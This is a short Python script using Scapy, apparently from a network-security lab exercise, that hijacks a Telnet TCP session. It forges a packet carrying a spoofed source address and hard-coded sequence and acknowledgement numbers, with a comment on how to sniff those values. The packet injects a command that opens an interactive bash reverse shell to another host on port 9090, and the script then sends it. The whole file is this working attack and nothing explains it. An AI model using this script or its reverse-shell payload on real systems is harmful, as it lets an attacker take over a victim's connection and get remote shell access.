#!/usr/bin/env python3
from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.7")
# sniff the last pkg A that transfer from 10.9.0.7 to 10.9.0.6
# seq = A.ack; ack = A.next_seq
tcp = TCP(sport=43098, dport=23, flags="A", seq=1219149373, ack=317246077)
data = "\r/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1\r"
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)

